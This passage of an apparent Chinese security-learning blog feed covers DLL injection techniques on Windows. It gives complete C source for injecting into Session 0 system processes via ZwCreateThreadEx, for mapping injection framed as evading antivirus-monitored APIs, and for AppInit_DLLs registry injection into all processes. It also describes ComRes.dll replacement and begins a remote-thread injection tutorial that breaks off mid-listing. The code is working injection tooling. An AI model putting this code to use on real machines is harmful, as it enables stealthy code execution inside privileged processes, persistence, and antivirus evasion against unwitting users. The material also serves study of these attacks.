        <content type="html"><![CDATA[<p>引入Session概念后，我们无法通过注入服务进程来实现可信任进程注入。当我们尝试注入session0当中的进程通常会失败，就是因为我们所处的session与系统服务进程不在同一个session当中。</p><span id="more"></span><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>​首先来解释一下Session隔离机制。在Windows XP、Windows Server 2003，以及更老版本的Windows操作系统中，服务和应用程序使用相同的会话（SESSION）来运行，而这个会话是由第一个登录到控制台的用户来启动的，该会话就称为SESSION 0。将服务和用户应用程序一起在SESSION 0中运行会导致安全风险，因为服务会使用提升后的权限来运行，而用户应用程序使用用户特权（大部分都是非管理员用户）运行，这会使得恶意软件把某个服务作为攻击目标，通过“劫持”该服务以达到提升自己权限级别的目的。</p><p>​从Windows VISTA开始，只有服务可以托管到SESSION 0中，用户应用程序和服务之间会进行隔离，并需要运行在用户登录系统时创建的后续会话中。如第一个登录用户创建Session 1，第二个登录用户创建Session 2，以此类推。</p><p>​我们使用<code>CreatRemoteThread</code>在普通用户进程注入shellcode或者Dll没问题，但是想要更进一步注入到系统进程中，那么就一定会失败，就是由于Session 0隔离的缘故。我们接下来就要解决这个问题。</p><h2 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h2><p>​引入Session隔离机制后，使用CreateRemoteThread创建远程线程时线程先挂起，然后判断是否运行在所属会话层后再决定是否恢复运行。</p><p>​<code>ZwCreateThreadEx</code>函数比<code>CreateRemoteThread</code>函数更接近内核，<code>CreateRemoteThread</code>最终也是调用<code>ZwCreateThreadEx</code>函数来创建线程的，通过前人对<code>CreateRemoteThread</code>逆向研究发现，在内部调<code>ZwCreateThreadEx</code>会把第七个参数创建标识设置为1，这样会使在系统服务创建的线程挂起，这也是注入失败的原因。</p><p>​只要你学过远程线程注入就明白这个技术的实现过程，只是将<code>CreateRemoteThread</code>换成了<code>ZwCreateThreadEx</code>。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ZwCreateThreadEx的32位和64位定义</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">LPVOID lpParameter,</span></span><br><span class="line"><span class="params">ULONG CreateThreadFlags,</span></span><br><span class="line"><span class="params">SIZE_T ZeroBits,</span></span><br><span class="line"><span class="params">SIZE_T StackSize,</span></span><br><span class="line"><span class="params">SIZE_T MaximumStackSize,</span></span><br><span class="line"><span class="params">LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span><br><span class="line"><span class="params">PHANDLE ThreadHandle,</span></span><br><span class="line"><span class="params">ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">LPVOID ObjectAttributes,</span></span><br><span class="line"><span class="params">HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="line"><span class="params">LPVOID lpParameter,</span></span><br><span class="line"><span class="params">BOOL CreateSuspended,</span></span><br><span class="line"><span class="params">DWORD dwStackSize,</span></span><br><span class="line"><span class="params">DWORD dw1,</span></span><br><span class="line"><span class="params">DWORD dw2,</span></span><br><span class="line"><span class="params">LPVOID pUnkown)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* typedef_LoadLibraryA)</span><span class="params">(<span class="type">char</span>* path)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//x64DLL路径</span></span><br><span class="line"><span class="type">char</span> DllPath[] = <span class="string">&quot;F:\\code_py&amp;C\\vs2017\\injecte\\Dll1\\x64\\Release\\Dll1.dll&quot;</span>;   </span><br><span class="line">    <span class="comment">//x32</span></span><br><span class="line"><span class="comment">//char DllPath[] = &quot;F:\\code_py&amp;C\\vs2017\\injecte\\Dll1\\Debug\\Dll1.dll&quot;;</span></span><br><span class="line">DWORD dwPid = <span class="number">28496</span> ;</span><br><span class="line">    </span><br><span class="line">HANDLE hRemoteThread;</span><br><span class="line"></span><br><span class="line">HMODULE hNtModule = GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">HMODULE hKeModule = GetModuleHandleA(<span class="string">&quot;Kernel32.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtModule, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line"></span><br><span class="line">typedef_LoadLibraryA myLoadLibraryA = (typedef_LoadLibraryA)GetProcAddress(hKeModule, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE,dwPid);</span><br><span class="line"></span><br><span class="line">LPVOID lpBaseAddress = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(DllPath) + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">WriteProcessMemory(hProcess, lpBaseAddress, DllPath, <span class="keyword">sizeof</span>(DllPath), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)myLoadLibraryA, lpBaseAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">CloseHandle(hRemoteThread);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">FreeLibrary(hKeModule);</span><br><span class="line">FreeLibrary(hNtModule);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Dll注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>映射注入</title>
      <link href="/2023/07/16/%E6%98%A0%E5%B0%84%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/07/16/%E6%98%A0%E5%B0%84%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>映射注入实际上的思路与远程线程注入一致，只不过映射注入改变了Dll的写入方式而已。</p><span id="more"></span><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>映射注入是一种内存注入技术，创建的Mapping对象本质上属于申请一块物理内存，而物理内存又能比较方便的通过系统函数直接映射到进程的虚拟内存中，就避免使用一些经典函数例如<code>VirtualAllocEx</code>,<code>WriteProcessMemory</code>等被杀毒软件严密监控的API。</p><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>在注入进程创建mapping对象，向被映射的虚拟地址空间写入shellcode，打开被注入的进程句柄，将mapping映射到被注入进程的虚拟地址，创建远程线程调用。</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;OneCore.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  DLL path</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* dllPath = <span class="string">&quot;F:\\code_py&amp;C\\vs2017\\injecte\\Dll1\\Debug\\Dll1.dll&quot;</span>;</span><br><span class="line"><span class="comment">//const char* dllPath = &quot;F:\\code_py&amp;C\\vs2017\\injecte\\Dll1\\x64\\Release\\Dll1.dll&quot;;</span></span><br><span class="line">DWORD pid = <span class="number">37836</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 打开目标程序</span></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"><span class="keyword">if</span> (!hProcess)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;目标进程打开失败. Error code: %d\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建dll路径的映射对象</span></span><br><span class="line">HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, PAGE_READWRITE, <span class="number">0</span>, <span class="built_in">strlen</span>(dllPath) + <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!hMapping)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;创建失败. Error code: %d\n&quot;</span>, GetLastError());</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将文件映射到当前进程</span></span><br><span class="line">LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, <span class="number">0</span>, <span class="number">0</span>, <span class="built_in">strlen</span>(dllPath) + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (!lpMapAddress)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;映射失败. Error code: %d\n&quot;</span>, GetLastError());</span><br><span class="line">CloseHandle(hMapping);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将dll路径写入映射内存</span></span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span>*)lpMapAddress, dllPath);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标进程中获取loadlibrary的路径</span></span><br><span class="line">LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pLoadLibraryA)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取LoadLibraryA函数失败. Error code: %d\n&quot;</span>, GetLastError());</span><br><span class="line">UnmapViewOfFile(lpMapAddress);</span><br><span class="line">CloseHandle(hMapping);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将文件映射映射到远程进程</span></span><br><span class="line">LPVOID lpRemoteMapAddress = MapViewOfFile2(hMapping, hProcess, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (!lpRemoteMapAddress)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to map view of file in the target process. Error code: %d\n&quot;</span>, GetLastError());</span><br><span class="line">UnmapViewOfFile(lpMapAddress);</span><br><span class="line">CloseHandle(hMapping);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建远程线程调用loadlibrary函数去加载dll</span></span><br><span class="line">HANDLE hRemoteThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pLoadLibraryA, lpRemoteMapAddress, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!hRemoteThread)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Failed to create a remote thread in the target process. Error code: %d\n&quot;</span>, GetLastError());</span><br><span class="line">UnmapViewOfFile(lpRemoteMapAddress);</span><br><span class="line">UnmapViewOfFile(lpMapAddress);</span><br><span class="line">CloseHandle(hMapping);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待线程运行结束</span></span><br><span class="line">WaitForSingleObject(hRemoteThread, INFINITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Cleanup</span></span><br><span class="line">CloseHandle(hRemoteThread);</span><br><span class="line">UnmapViewOfFile(lpRemoteMapAddress);</span><br><span class="line">UnmapViewOfFile(lpMapAddress);</span><br><span class="line">CloseHandle(hMapping);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Dll注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ComRes注入</title>
      <link href="/2023/07/13/COMRes%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/07/13/COMRes%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>学习下来感觉是一个用处不大、适用性很窄的一种注入手法。</p><span id="more"></span><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>当被注入程序使用<code>CoCreateInstance()</code>这个API时，Com服务器会加载ComRes.dll到被注入程序中。只要我们替换掉这个ComRes.dll文件，就可以实现注入。ComRes.dll位于Windows 系统中C:\WINDOWS\system32目录下。</p><h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>我们很容易就能看出这种注入方法的限制，只能对调用<code>CoCreateInstance()</code>的程序进行注入，泛用性不高。并且当程序加载过comRes.dll文件后，再进行替换也会失效，注入时机也很重要。</p><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>编写伪造Dll文件替换原文件</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>没有代码实现，替换个文件就不需要写代码了吧(😀笑)</p>]]></content>
      
      
      <categories>
          
          <category> Dll注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>注册表注入</title>
      <link href="/2023/07/13/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/07/13/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>说实话，注册表是杀软严密监视的地方，我觉得现在对注册表进行的操作十有八九都会被查出来（但技术还是要学的）。</p><span id="more"></span><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>主要依赖于两个表项，<code>AppInit_Dlls</code>和<code>LoadAppInit_DLLs</code>。<code>AppInit_Dlls</code>写入dll完整路径，<code>LoadAppInit_DLLs</code>写为1，重启后，指定DLL会注入到所有运行进程。<code>User32.dll</code>在被加载到进程时，会读取<code>AppInit_Dlls</code>表项。若有值，会调用<code>LoadLibrary</code>来载入这个字符串中指定的每个DLL。所以注册表注入只对加载<code>user32.dll</code>的进程有效。</p><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>说实话这种方法的思路也没什么好说的，甚至不需要编写程序就可以实现。</p><ul><li>打开注册表键值如下：<code>HKEY_LOCAL_MACHINE\SoftWare\MicroSoft\Windows NT\CurrentVersion\Windows\</code>；</li><li>在上面的注册表项中操作 <code>AppInit_DLLs</code> 键值，在该键值中添加自己的DLL的全路径加dll名，多个DLL以逗号或者空格分开；</li><li>在该注册表项中添加键值<code>LoadAppInit_DLLs</code>，类型为<code> DWORD</code>，并将其值置为 1 。</li></ul><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">HKEY hKey;</span><br><span class="line"><span class="type">char</span> csAppInitValue[] = <span class="string">&quot;F:\\code_py&amp;C\\vs2017\\injecte\\Dll1\\x64\\Release\\Dll1.dll&quot;</span>;</span><br><span class="line">DWORD dwLoadAppInitValue = <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> csSubKey[] = <span class="string">&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\&quot;</span>;</span><br><span class="line">    <span class="comment">//打开注册表</span></span><br><span class="line">LSTATUS lsRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, <span class="string">L&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows&quot;</span>, <span class="number">0</span>, KEY_READ, &amp;hKey);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (lsRet != ERROR_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Open Key Failed....\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> csBuf[<span class="number">100</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">DWORD dwSize = <span class="number">100</span>;</span><br><span class="line">DWORD dwType = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">RegQueryValueExA(hKey, <span class="string">&quot;AppInit_DLLs&quot;</span>, <span class="number">0</span>, &amp;dwType, (LPBYTE)csBuf, &amp;dwSize);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> nSize = <span class="built_in">strlen</span>(csAppInitValue);</span><br><span class="line">    <span class="comment">//添加Dll路径</span></span><br><span class="line">lsRet = RegSetValueExA(hKey, <span class="string">&quot;AppInit_DLLs&quot;</span>, <span class="number">0</span>, REG_SZ, (<span class="type">const</span> BYTE *)csAppInitValue, nSize + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (lsRet != ERROR_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Set Key Failed1....\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将LoadAppInit_DLLs设为1</span></span><br><span class="line">lsRet = RegSetValueExA(hKey, <span class="string">&quot;LoadAppInit_DLLs&quot;</span>, <span class="number">0</span>, REG_DWORD, (<span class="type">const</span> BYTE *)&amp;dwLoadAppInitValue, <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (lsRet != ERROR_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Set Key Failed2....\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RegCloseKey(hKey);</span><br><span class="line"></span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Dll注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>远程线程注入</title>
      <link href="/2023/07/10/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/07/10/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>​在Dll注入技术学习中，远程线程注入可以说是最容易理解的一种注入技术了。通过这种技术，我们也可以触类旁通其他注入技术。</p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>现在有三个程序：目标注入进程、注入加载进程以及Dll。</p><p>我们都知道一个exe文件会去加载自己所需要的Dll去运行，通常是一些系统Dll，如果有需要，也会加载自己编写的Dll。这里就出现了我们的利用点，也就是windows肯定提供了API供我们使用去加载Dll。那么接下来的思路就是利用API函数加载Dll并执行Dll中的函数。</p><p>执行思路：通过目标进程pid获取进程句柄 -&gt; 在目标进程开辟空间 -&gt; 在开辟空间写入Dll的路径 -&gt; 目标进程中创建远程线程加载Dll。</p><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><h3 id="获取进程句柄"><a href="#获取进程句柄" class="headerlink" title="获取进程句柄"></a>获取进程句柄</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回值是进程句柄</span></span><br><span class="line">HANDLE <span class="title function_">OpenProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] DWORD dwDesiredAccess,<span class="comment">//一般获取权限为PROCESS_ALL_ACCESS权限</span></span></span><br><span class="line"><span class="params">  [in] BOOL  bInheritHandle,<span class="comment">//不重要</span></span></span><br><span class="line"><span class="params">  [in] DWORD dwProcessId<span class="comment">//目标进程pid</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><h3 id="加载Dll（重要）"><a href="#加载Dll（重要）" class="headerlink" title="加载Dll（重要）"></a>加载Dll（重要）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回值是Dll句柄</span></span><br><span class="line">HMODULE <span class="title function_">LoadLibraryA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] LPCSTR lpLibFileName<span class="comment">//加载的Dll名称</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><h3 id="获取Dll的导出函数"><a href="#获取Dll的导出函数" class="headerlink" title="获取Dll的导出函数"></a>获取Dll的导出函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回值是导出函数地址</span></span><br><span class="line">FARPROC <span class="title function_">GetProcAddress</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HMODULE hModule,<span class="comment">//Dll句柄</span></span></span><br><span class="line"><span class="params">  [in] LPCSTR  lpProcName<span class="comment">//导出函数名称</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><h3 id="开辟内存空间"><a href="#开辟内存空间" class="headerlink" title="开辟内存空间"></a>开辟内存空间</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//返回值是开辟出的内存地址</span></span><br><span class="line">LPVOID <span class="title function_">VirtualAllocEx</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]           HANDLE hProcess,<span class="comment">//进程句柄</span></span></span><br><span class="line"><span class="params">  [in, optional] LPVOID lpAddress,<span class="comment">//NULL</span></span></span><br><span 